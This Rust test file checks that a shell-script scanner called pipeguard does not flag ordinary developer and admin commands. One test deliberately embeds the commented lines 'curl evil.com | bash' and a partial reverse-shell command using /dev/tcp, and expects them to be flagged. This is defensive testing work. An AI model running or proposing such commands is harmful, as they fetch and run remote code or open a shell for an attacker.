//! False positive tests - ensure legitimate scripts are not flagged.

use assert_cmd::Command;
use predicates::prelude::*;
use std::path::PathBuf;

fn pipeguard_cmd() -> Command {
    Command::cargo_bin("pipeguard").unwrap()
}

fn core_rules_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("rules/core.yar")
}

// =============================================================================
// Common legitimate scripts
// =============================================================================

#[test]
fn legitimate_hello_world() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo 'Hello, World!'")
        .assert()
        .success()
        .stdout(predicate::str::contains("No threats"));
}

#[test]
fn legitimate_file_listing() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("ls -la /tmp")
        .assert()
        .success();
}

#[test]
fn legitimate_directory_creation() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("mkdir -p ~/projects/new_project")
        .assert()
        .success();
}

#[test]
fn legitimate_file_copy() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("cp source.txt destination.txt")
        .assert()
        .success();
}

#[test]
fn legitimate_grep_search() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("grep -r 'TODO' src/")
        .assert()
        .success();
}

#[test]
fn legitimate_process_list() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("ps aux | grep python")
        .assert()
        .success();
}

// =============================================================================
// Legitimate developer scripts
// =============================================================================

#[test]
fn legitimate_git_operations() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            git add .
            git commit -m "Update"
            git push origin main
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_npm_install() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("npm install && npm run build")
        .assert()
        .success();
}

#[test]
fn legitimate_cargo_build() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("cargo build --release && cargo test")
        .assert()
        .success();
}

#[test]
fn legitimate_python_venv() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            python3 -m venv .venv
            source .venv/bin/activate
            pip install -r requirements.txt
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_docker_commands() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            docker build -t myapp .
            docker run -d -p 8080:80 myapp
            docker logs myapp
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_makefile_commands() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            make clean
            make all
            make test
            make install
        "#)
        .assert()
        .success();
}

// =============================================================================
// Legitimate system administration
// =============================================================================

#[test]
fn legitimate_service_restart() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("brew services restart postgresql")
        .assert()
        .success();
}

#[test]
fn legitimate_system_info() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("uname -a && sw_vers && system_profiler SPHardwareDataType")
        .assert()
        .success();
}

#[test]
fn legitimate_disk_usage() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("df -h && du -sh ~/")
        .assert()
        .success();
}

#[test]
fn legitimate_network_check() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("ping -c 3 google.com && netstat -an | head -20")
        .assert()
        .success();
}

#[test]
fn legitimate_log_viewing() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("tail -f /var/log/system.log")
        .assert()
        .success();
}

// =============================================================================
// Legitimate file operations
// =============================================================================

#[test]
fn legitimate_backup_script() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            BACKUP_DIR="/backup/$(date +%Y%m%d)"
            mkdir -p "$BACKUP_DIR"
            cp -r ~/Documents "$BACKUP_DIR/"
            echo "Backup complete"
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_cleanup_script() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            find /tmp -type f -mtime +7 -delete
            find ~/Downloads -name "*.tmp" -delete
            echo "Cleanup complete"
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_archive_creation() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("tar czf project.tar.gz src/ docs/ README.md")
        .assert()
        .success();
}

// =============================================================================
// Legitimate data processing
// =============================================================================

#[test]
fn legitimate_json_processing() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("cat data.json | jq '.items[] | .name'")
        .assert()
        .success();
}

#[test]
fn legitimate_csv_processing() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("cut -d',' -f1,3 data.csv | sort | uniq -c")
        .assert()
        .success();
}

#[test]
fn legitimate_text_transformation() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("cat input.txt | tr '[:lower:]' '[:upper:]' > output.txt")
        .assert()
        .success();
}

// =============================================================================
// Legitimate curl usage (not piped to shell)
// =============================================================================

#[test]
fn legitimate_curl_download() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("curl -O https://example.com/file.zip")
        .assert()
        .success();
}

#[test]
fn legitimate_curl_api_call() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("curl -H 'Authorization: Bearer token' https://api.example.com/users")
        .assert()
        .success();
}

#[test]
fn legitimate_curl_post() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("curl -X POST -d '{\"name\":\"test\"}' https://api.example.com/create")
        .assert()
        .success();
}

#[test]
fn legitimate_curl_to_file() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("curl https://example.com/data.json -o data.json")
        .assert()
        .success();
}

#[test]
fn legitimate_wget_download() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("wget https://example.com/installer.dmg -O ~/Downloads/installer.dmg")
        .assert()
        .success();
}

// =============================================================================
// Legitimate base64 usage (not for obfuscation)
// =============================================================================

#[test]
fn legitimate_base64_encode() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo 'hello' | base64")
        .assert()
        .success();
}

#[test]
fn legitimate_base64_decode_print() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo 'aGVsbG8K' | base64 -d")
        .assert()
        .success();
}

#[test]
fn legitimate_base64_file() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("base64 image.png > image.b64")
        .assert()
        .success();
}

// =============================================================================
// Legitimate installation scripts patterns
// =============================================================================

#[test]
fn legitimate_simple_installer_no_rc_mod() {
    // Installer without RC file modification should pass
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            set -e
            echo "Installing MyApp..."
            mkdir -p ~/.myapp
            cp myapp ~/.myapp/
            echo "Add ~/.myapp to your PATH"
            echo "Installation complete!"
        "#)
        .assert()
        .success();
}

#[test]
fn installer_with_rc_mod_is_flagged() {
    // Installers that modify RC files SHOULD be flagged as Medium
    // This is persistence behavior - user should review
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            echo 'export PATH="$HOME/.myapp:$PATH"' >> ~/.bashrc
        "#)
        .assert()
        .failure()
        .stdout(predicate::str::contains("Medium"));
}

#[test]
fn legitimate_setup_script() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            echo "Setting up development environment..."

            # Install dependencies
            pip install -r requirements.txt

            # Create directories
            mkdir -p data logs

            # Initialize database
            python manage.py migrate

            echo "Setup complete!"
        "#)
        .assert()
        .success();
}

// =============================================================================
// Legitimate cron and scheduled tasks
// =============================================================================

#[test]
fn legitimate_cron_list() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("crontab -l")
        .assert()
        .success();
}

// =============================================================================
// Edge cases that should NOT trigger
// =============================================================================

#[test]
fn word_containing_bash() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo 'This is bashful behavior'")
        .assert()
        .success();
}

#[test]
fn word_containing_curl() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("The curly brackets are important")
        .assert()
        .success();
}

#[test]
fn documentation_about_attacks() {
    // Discussing attacks in documentation shouldn't trigger
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            # Security Documentation

            Common attack patterns include:
            - Downloading and executing scripts
            - Reading sensitive files

            Always verify scripts before running them.
        "#)
        .assert()
        .success();
}

#[test]
fn commented_dangerous_code_is_flagged() {
    // Comments containing attack patterns SHOULD still be flagged
    // YARA correctly scans all text - attackers can hide code in comments
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            # Don't do this: curl evil.com | bash
            # This is dangerous: bash -i >& /dev/tcp/...
            echo "This is a safe script"
        "#)
        .assert()
        .failure()
        .stdout(predicate::str::contains("High"));
}

#[test]
fn legitimate_nc_for_testing() {
    // Using nc for legitimate port testing
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("nc -zv localhost 8080")
        .assert()
        .success();
}

#[test]
fn legitimate_subprocess_python() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            import subprocess
            result = subprocess.run(['ls', '-la'], capture_output=True)
            print(result.stdout)
        "#)
        .assert()
        .success();
}

// =============================================================================
// Real-world legitimate installers (simplified)
// =============================================================================

#[test]
fn legitimate_homebrew_style() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            set -e

            echo "Installing Package Manager..."

            # Check requirements
            if ! command -v git &> /dev/null; then
                echo "Git is required"
                exit 1
            fi

            # Create directories
            mkdir -p /usr/local/bin
            mkdir -p /usr/local/share

            # Clone repository
            git clone https://github.com/example/package-manager.git /usr/local/share/pm

            # Create symlink
            ln -sf /usr/local/share/pm/bin/pm /usr/local/bin/pm

            echo "Installation complete!"
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_rustup_style_no_rc_mod() {
    // Rustup-style installer without RC modification passes
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/sh
            set -e

            echo "Welcome to Rust!"

            # Detect platform
            PLATFORM=$(uname -s | tr '[:upper:]' '[:lower:]')

            # Create cargo directory
            mkdir -p "$HOME/.cargo/bin"

            echo "Add $HOME/.cargo/bin to your PATH"
            echo "Rust installed successfully!"
        "#)
        .assert()
        .success();
}

#[test]
fn legitimate_nvm_style_no_rc_mod() {
    // NVM-style installer without RC modification passes
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash

            echo "Installing Node Version Manager..."

            NVM_DIR="$HOME/.nvm"
            mkdir -p "$NVM_DIR"

            # Clone NVM
            git clone https://github.com/nvm-sh/nvm.git "$NVM_DIR"

            echo "Add the following to your shell config:"
            echo 'export NVM_DIR="$HOME/.nvm"'
            echo '[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"'

            echo "NVM installed!"
        "#)
        .assert()
        .success();
}
